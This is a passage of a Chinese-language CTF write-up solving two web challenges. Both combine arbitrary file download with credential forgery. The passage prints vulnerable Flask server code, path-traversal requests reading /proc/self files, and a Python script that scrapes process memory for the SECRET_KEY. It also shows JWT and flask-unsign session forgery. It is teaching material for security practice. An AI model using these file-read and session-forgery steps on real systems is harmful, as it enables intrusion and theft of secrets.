algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'1.jpg'</span><span class="token punctuation">)</span>    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/images'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> filename <span class="token operator">==</span> <span class="token string">"yuanshen?qidong!"</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/readflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Error executing /readflag: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>        mime_type<span class="token punctuation">,</span> encoding <span class="token operator">=</span> mimetypes<span class="token punctuation">.</span>guess_type<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>        <span class="token keyword">if</span> mime_type <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            mime_type <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> mime_type<span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'attachment; filename=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> response    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found."</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Server Error: %s'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"好像有什么错误喵!"</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>分析代码后发现只有满足以下两个条件才能调用 <code>/readflag</code> subprocess 来读取flag：</p><ul><li>Cookies <code>auth</code> 经过 jwt 解析后包含 <code>&#123;&quot;username&quot;:&quot;admin&quot;&#125;</code> 字段</li><li>filename 的 GET 传参为 <code>yuanshen?qidong!</code></li></ul><h2 id="2-JWT-Json-Web-Tokens"><a href="#2-JWT-Json-Web-Tokens" class="headerlink" title="2. JWT (Json Web Tokens)"></a>2. JWT (Json Web Tokens)</h2><p>从 F12 开发人员工具中找到当前 Cookies <code>auth</code> 的值</p><p><img src="image-38.png" alt="image-38.png"></p><pre class="language-none"><code class="language-none">auth &#x3D; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.6tqEhsR0SEHG-GL7hEar5Ewi2dQbGSEz-3NoPrZxi1Y</code></pre><h3 id="2-1-JWT-的组成"><a href="#2-1-JWT-的组成" class="headerlink" title="2.1 JWT 的组成"></a>2.1 JWT 的组成</h3><p><img src="image-39.png" alt="image-39.png"></p><p>JWT 通常是一个很长的字符串，中间用两个 <code>.</code> 分隔成三个部分，依次为：</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p>该字符串应形如：Header.Payload.Signature</p><p>下面将分别解释三个部分的内容及其作用：</p><h4 id="2-1-1-Header"><a href="#2-1-1-Header" class="headerlink" title="2.1.1 Header"></a>2.1.1 Header</h4><p>Header 部分是一个 JSON 对象，用于描述 JWT 的元数据，它通常是这样的：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span></code></pre><p>其中：</p><ul><li><p><code>alg</code> 属性表示 <code>Signature</code> 的加密算法，默认是 <code>HMAC SHA256</code> （写成 <code>HS256</code> ）</p></li><li><p><code>typ</code> 属性表示 <code>token</code> 的类型，<code>JWT</code> 类型统一写为 <code>JWT</code></p></li></ul><p>最后，将上面的 JSON 对象使用 <code>Base64URL</code> 算法（详见后文）转成字符串</p><h4 id="2-1-2-Payload"><a href="#2-1-2-Payload" class="headerlink" title="2.1.2 Payload"></a>2.1.2 Payload</h4><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据</p><p>由于该部分可以通过 <code>Base64URL</code> 进行解密并被读取，此处一般不存放密文</p><p>这个 JSON 对象最后也要使用 <code>Base64URL</code> 算法（详见后文）转成字符串</p><h4 id="2-1-3-Signature"><a href="#2-1-3-Signature" class="headerlink" title="2.1.3 Signature"></a>2.1.3 Signature</h4><p>Signature 部分是对前两部分的签名，防止数据在传输过程中被篡改</p><p>签名由 Header 里面指定的签名算法（默认是 <code>HMAC SHA256</code> ）和 设置好的密钥（ <code>secret_key</code> ）产生：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">HMACSHA256</span><span class="token punctuation">(</span><span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span></code></pre><p>最后，把 Header、Payload、Signature 三个部分拼成一个字符串，</p><p>每个部分之间用 <code>.</code> 分隔，就形成了一个有效的 JSON Web Token</p><h4 id="2-1-4-Base64URL"><a href="#2-1-4-Base64URL" class="headerlink" title="2.1.4 Base64URL"></a>2.1.4 Base64URL</h4><p>前面提到，将 Header 和 Payload 串型化的算法是 <code>Base64URL</code>，</p><p>该算法跟 <code>Base64</code> 算法基本类似，但有一些不同：</p><ul><li>省略通过 <code>Base64</code> 算法得到的 <code>=</code> </li><li>将通过 <code>Base64</code> 算法得到的 <code>+</code> 替换成 <code>-</code> ，<code>/</code> 替换成 <code>_</code></li></ul><p>这是因为 JWT 作为一个 <code>token</code> ，有时会被应用于 URL 中（例如 <code>/?token=xxx</code>）,</p><p>通过 <code>Base64</code> 算法得到的三个字符 ( <code>+</code> 、 <code>/</code> 、 <code>=</code> ) ，在 URL 里面有特殊含义，所以需要进行省略或替换</p><h3 id="2-2-JWT的伪造"><a href="#2-2-JWT的伪造" class="headerlink" title="2.2 JWT的伪造"></a>2.2 JWT的伪造</h3><p>使用 <a href="https://jwt.io/">jwt.io</a> 解析</p><p><img src="image-40.png" alt="image-40.png"></p><p>分析代码后可以发现 Cookies <code>auth</code> 的 <code>SECRET_KEY</code> 为 <code>I_LIKE_Aoyama_Nanami</code></p><p>在 <a href="https://jwt.io/">jwt.io</a> 中使用 SECRET_KEY 伪造 <code>&#123;&quot;username&quot;:&quot;admin&quot;&#125;</code> 字段并重新加密，</p><p>得到伪造后的 <code>auth</code> 如下：</p><p><img src="image-41.png" alt="image-41.png"></p><pre class="language-none"><code class="language-none">auth &#x3D; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.mJHHgw5KDOeM6Fu5r7KXYUb-chM02YBqsqmTWMAdDR0</code></pre><h2 id="3-Payload"><a href="#3-Payload" class="headerlink" title="3. Payload"></a>3. Payload</h2><p>修改 <code>auth</code> 为伪造后的值并访问 <code>/download?filename=yuanshen?qidong!</code>，得到 <code>flag</code></p><p><img src="image-42.png" alt="image-42.png"></p><blockquote><p>Spirit{6bb3de28-1cc8-4af3-babe-43593039f366}</p></blockquote><h1 id="你真的喜欢鸣濑白羽吗"><a href="#你真的喜欢鸣濑白羽吗" class="headerlink" title="你真的喜欢鸣濑白羽吗"></a>你真的喜欢鸣濑白羽吗</h1><p>题目描述：</p><blockquote><p>不是真的喜欢鸣濑白羽(?)的人拿不到flag</p></blockquote><p>打开页面后发现又是一个图库管理下载系统 (？)</p><p><img src="image-43.png" alt="image-43.png"></p><p>但是点击 <code>Download</code> 后跳转至 <code>/download?filename=1.jpg</code> </p><p>发现图片下载不下来，显示如下：</p><p><img src="image-44.png" alt="image-44.png"></p><p>猜测服务端代码对文件读取方式进行了修改</p><h2 id="1-任意文件读取漏洞-1"><a href="#1-任意文件读取漏洞-1" class="headerlink" title="1. 任意文件读取漏洞"></a>1. 任意文件读取漏洞</h2><p>与上一题相同，<code>/download?filename=xxxx</code> 处仍存在任意文件读取漏洞</p><p>访问 <code>/download?filename=/proc/self/cmdline</code> , 内容如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python /app/I_LIKE_Nanami.py</code></pre><p>根据服务端代码路径访问 <code>/download?filename=/app/I_LIKE_Nanami.py</code>,</p><p>得到服务端代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> secrets<span class="token keyword">import</span> subprocess<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> sessionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>random_string <span class="token operator">=</span> <span class="token string">"I_LIKE_"</span><span class="token operator">+</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_Aoyama_Nanami"</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> random_string<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'1.jpg'</span><span class="token punctuation">)</span>    offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'offset'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'length'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> filename <span class="token operator">==</span> <span class="token string">"xingtie?qidong!"</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>             output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/readflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Error executing /readflag: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/images'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> offset <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>length<span class="token punctuation">)</span>            <span class="token keyword">return</span> data    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>        <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Server Error: %s'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"好像有什么错误喵!"</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>分析代码后发现只有满足以下两个条件才能调用 <code>/readflag</code> subprocess 来读取flag：</p><ul><li>python flask <code>session</code> 包含 <code>&#123;&quot;username&quot;:&quot;admin&quot;&#125;</code> 字段</li><li>filename 的 GET 传参为 <code>xingtie?qidong!</code></li></ul><h2 id="2-Python-Flask-Session"><a href="#2-Python-Flask-Session" class="headerlink" title="2. Python Flask Session"></a>2. Python Flask Session</h2><p>从 F12 开发人员工具中找到当前 Cookies <code>session</code> 的值</p><p><img src="image-45.png" alt="image-45.png"></p><pre class="language-none"><code class="language-none">session &#x3D; eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZRRgdA.WGZwA7J0tKtifRUgBXyh5DmPmzs</code></pre><h3 id="2-1-Session-的组成"><a href="#2-1-Session-的组成" class="headerlink" title="2.1 Session 的组成"></a>2.1 Session 的组成</h3><p>Python Flask Session 通常是一个很长的字符串，中间用两个 <code>.</code> 分隔成三个部分（如果使用了zlib compress，则开头会多出一个 <code>.</code>，该部分归属于Session Data内），依次为：</p><ul><li>Session Data（ Session 数据 ）</li><li>Timestamp（ 时间戳 ）</li><li>Cryptographic Hash（ 签名 ）</li></ul><p>该字符串应形如：Session Data.Timestamp.Cryptographic Hash</p><p>下面将分别解释三个部分的内容及其作用：</p><h4 id="2-1-1-Session-Data"><a href="#2-1-1-Session-Data" class="headerlink" title="2.1.1 Session Data"></a>2.1.1 Session Data</h4><p>Session Data 部分是一个 JSON 对象，用来存放实际需要传递的数据</p><p>Session 在生成时会根据使用 zlib compress 能否减少 Session Data 部分的长度</p><p>来选择性地使用 zlib compress ( 使用的标志是Session Data 以 <code>.</code> 开头 )</p><p>由于该部分可以通过 <code>Base64URL</code> 进行解密并被读取，此处一般不存放密文</p><p>这个 JSON 对象最后也要使用 <code>Base64URL</code> 算法（详见后文）转成字符串</p><h4 id="2-1-2-Timestamp"><a href="#2-1-2-Timestamp" class="headerlink" title="2.1.2 Timestamp"></a>2.1.2 Timestamp</h4><p>Timestamp 部分通常由 Session 生成时间的时间戳构成</p><p>该时间戳最后会被转化为字节形式并使用 <code>Base64URL</code> 算法（详见后文）进行加密</p><h4 id="2-1-3-Cryptograhpic-Hash"><a href="#2-1-3-Cryptograhpic-Hash" class="headerlink" title="2.1.3 Cryptograhpic Hash"></a>2.1.3 Cryptograhpic Hash</h4><p><code>Python Flask Session</code> 在生成 <code>Session</code> 的校验签名时</p><p>会先对 <code>secret_key</code> 进行操作</p><p>首先对 <code>secret_key</code> 进行一次 <code>sha1</code> 加密</p><p>并用 <code>&quot;cookie-session&quot;</code>  salt 来 update 加密后的 <code>secert_key</code></p><p>接着将 <code>Session Data + sep + Timestamp</code> 使用处理完成的 <code>secret_key</code> 进行一次 <code>sha1</code> 加密</p><p>最后将得到的数据使用 <code>Base64URL</code> 算法（详见后文）进行加密</p><h4 id="2-1-4-Base64URL-1"><a href="#2-1-4-Base64URL-1" class="headerlink" title="2.1.4 Base64URL"></a>2.1.4 Base64URL</h4><p>前面提到，将 Session Data、Timestamp 和 Cryptograhpic Hash 串型化的算法是 <code>Base64URL</code>，</p><p>该算法跟 <code>Base64</code> 算法基本类似，但有一些不同：</p><ul><li>省略通过 <code>Base64</code> 算法得到的 <code>=</code> </li><li>将通过 <code>Base64</code> 算法得到的 <code>+</code> 替换成 <code>-</code> ，<code>/</code> 替换成 <code>_</code></li></ul><p>这是因为 Session 作为一个 <code>token</code> ，有时会被应用于 URL 中（例如 <code>/?token=xxx</code>）,</p><p>通过 <code>Base64</code> 算法得到的三个字符 ( <code>+</code> 、 <code>/</code> 、 <code>=</code> ) ，在 URL 里面有特殊含义，所以需要进行省略或替换</p><h3 id="2-2-Session-的伪造"><a href="#2-2-Session-的伪造" class="headerlink" title="2.2 Session 的伪造"></a>2.2 Session 的伪造</h3><p>由于服务端代码使用了包含随机字符的 <code>random_string</code> 作为 <code>SECRET_KEY</code>,</p><p>而 Session 的 <code>Cryptographic Hash</code> 需要使用 SECRET_KEY 作为密钥，</p><p>因此在伪造 Session 前我们需要先利用任意文件读取漏洞获取 <code>SECRET_KEY</code></p><p>由于 Python Flask 在运行时会将 SECRET_KEY 写入内存中，</p><p>我们可以利用任意文件读取漏洞读取内存来获得 SECRET_KEY</p><p>Python 内存读取脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token punctuation">(</span>SpiritCTF Server URL <span class="token keyword">with</span> port<span class="token punctuation">)</span>rw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>map_list <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/download?filename=/proc/self/maps"</span></span><span class="token punctuation">)</span>map_list <span class="token operator">=</span> map_list<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> map_list<span class="token punctuation">:</span>    map_addr <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"([a-z0-9]+)-([a-z0-9]+) r"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>    <span class="token keyword">if</span> map_addr<span class="token punctuation">:</span>        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>map_addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>map_addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        rw<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> k <span class="token keyword">in</span> rw<span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/download?filename=/proc/self/mem&amp;offset=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">&amp;length=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        secret_key <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"I_LIKE_[a-f0-9]&#123;32&#125;_Aoyama_Nanami"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> secret_key<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SECRET_KEY = \""</span> <span class="token operator">+</span> secret_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\""</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span></code></pre><p>运行脚本后得到：</p><pre class="language-none"><code class="language-none">SECRET_KEY &#x3D; &quot;I_LIKE_f9d2e4914fec5f9f26fad0a0e4da3afe_Aoyama_Nanami&quot;</code></pre><p>使用 <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a> 工具对 Session 进行伪造并签名</p><pre class="language-bash" data-language="bash"><code class="language-bash">flask-unsign <span class="token parameter variable">--sign</span> <span class="token parameter variable">--cookie</span> <span class="token string">"&#123;'username': 'admin'&#125;"</span> <span class="token parameter variable">--secret</span> <span class="token string">'I_LIKE_f9d2e4914fec5f9f26fad0a0e4da3afe_Aoyama_Nanami'</span></code></pre><p>得到 Session 如下：</p><pre class="language-none"><code class="language-none">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZRRqXA.6kG8cNrvnCI73R2nxAF8iOSA6Ko</code></pre><p>修改Cookies <code>Session</code> 并访问 <code>/download?filename=xingtie?qidong!</code>，得到 <code>flag</code></p><p><img src="image-46.png" alt="image-46.png"></p><blockquote><p>Spirit{7d05af5f-202d-4578-8833-f598ad794b48}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
            <tag> Python </tag>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
